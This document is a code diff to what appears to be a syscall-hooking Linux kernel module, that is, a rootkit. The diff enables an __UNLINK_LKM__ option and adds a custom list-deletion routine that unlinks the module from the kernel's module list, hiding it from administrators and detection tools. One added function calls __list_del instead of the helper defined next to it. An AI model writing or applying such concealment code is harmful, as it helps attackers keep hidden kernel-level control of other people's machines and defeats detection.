@@ -15,6 +15,7 @@
 #include <linux/notifier.h>
 
 #include <linux/version.h>
+#include <linux/poison.h>
 
 #ifdef CONFIG_VM86
 #define VM_MASK         0x00020000
@@ -30,7 +31,7 @@
 
 #define __SYSENTER_ENABLE__
 
-//#define __UNLINK_LKM__
+#define __UNLINK_LKM__
 
 /* define this if you want (very) verbose kern logs */
 
@@ -41,6 +42,32 @@
 #else
     #define DEBUGLOG(a) ""
 #endif
+
+/*
+ * Delete a list entry by making the prev/next entries
+ * point to each other.
+ *
+ * This is only for internal list manipulation where we know
+ * the prev/next entries already!
+ */
+static inline void __our_list_del(struct list_head * prev, struct list_head * next)
+{
+        next->prev = prev;
+        prev->next = next;
+}
+
+/**
+ * list_del - deletes entry from list.
+ * @entry: the element to delete from the list.
+ * Note: list_empty() on entry does not return true after this, the entry is
+ * in an undefined state.
+ */
+static inline void our_list_del(struct list_head *entry)
+{
+        __list_del(entry->prev, entry->next);
+        entry->next = LIST_POISON1;
+        entry->prev = LIST_POISON2;
+}
 
 /* hooks live here - has sys_table_global */
 #include "hooktable.h"
@@ -629,7 +656,7 @@ static int __init init_DR(void)
 
 #ifdef __UNLINK_LKM__
 
-    list_del(&THIS_MODULE->list);
+    our_list_del(&THIS_MODULE->list);
 
 #endif
 
